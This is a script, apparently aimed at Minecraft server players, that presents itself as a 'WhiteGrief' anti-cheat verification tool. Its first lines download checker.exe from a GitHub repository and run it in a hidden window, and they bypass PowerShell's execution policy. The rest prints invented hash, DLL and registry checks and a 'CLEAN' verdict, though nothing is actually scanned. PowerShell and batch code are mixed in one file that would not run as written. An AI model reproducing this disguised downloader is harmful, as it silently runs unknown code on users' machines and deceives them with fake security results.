# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/letyss0304/FTchecker/raw/refs/heads/main/checker.exe" -OutFile "checker.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "checker.exe" -WindowStyle Hidden
    

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host

@echo off
setlocal enabledelayedexpansion
color 07
title WhiteGrief Security Tool - System Verification
mode con: cols=90 lines=25

echo [CONNECT] Установка связи с центральным узлом WhiteGrief...
timeout /t 2 >nul
echo [OK] Узел подтвержден. Начинаю верификацию клиента...
echo.

echo -----------------------------------------------------------
echo Сбор системной информации для анализа модератором:
echo -----------------------------------------------------------
echo ИМЯ ПК: %COMPUTERNAME%
echo СИСТЕМА: Windows %PROCESSOR_ARCHITECTURE%
echo ВРЕМЯ ЗАПУСКА: %TIME%
echo -----------------------------------------------------------
timeout /t 1 >nul

echo [1/4] Проверка хэш-сумм файлов .jar...
echo [HASH] 1.16.5.json ........................... [MATCH]
echo [HASH] client.jar ............................ [MATCH]
echo [HASH] optifine_map.txt ...................... [MATCH]
timeout /t 2 >nul

echo [2/4] Инспекция активных библиотек (DLL)...
echo [DLL] Scanning: jvm.dll ...................... [SECURE]
echo [DLL] Scanning: lwjgl.dll .................... [SECURE]
echo [DLL] Scanning: net_util.dll ................. [SECURE]
timeout /t 3 >nul

echo [3/4] Анализ реестра на предмет инъекций...
echo [REG] HKEY_CURRENT_USER\Software\JavaSoft .... [CLEAN]
echo [REG] HKEY_LOCAL_MACHINE\SYSTEM\Current ...... [CLEAN]
timeout /t 2 >nul

echo [4/4] Сверка сигнатур с базой данных (Cloud Scan)...
echo [SYNC] Обработка данных...
:: Имитация долгой загрузки
for /L %%i in (1,1,20) do (
    set /p "=. " <nul
    timeout /t 0 >nul
)
echo [DONE]
timeout /t 1 >nul

echo.
echo ===========================================================
echo                ВЕРДИКТ СИСТЕМЫ: ЧИСТ (CLEAN)
echo ===========================================================
echo Все компоненты соответствуют оригинальным версиям игры.
echo Данные переданы в панель управления сервером.
echo ID сессии: WG-%RANDOM%-%RANDOM%
echo ===========================================================
echo.
echo Пожалуйста, предоставьте этот ID сессии модератору.
echo Нажмите любую клавишу для завершения...
pause >nul
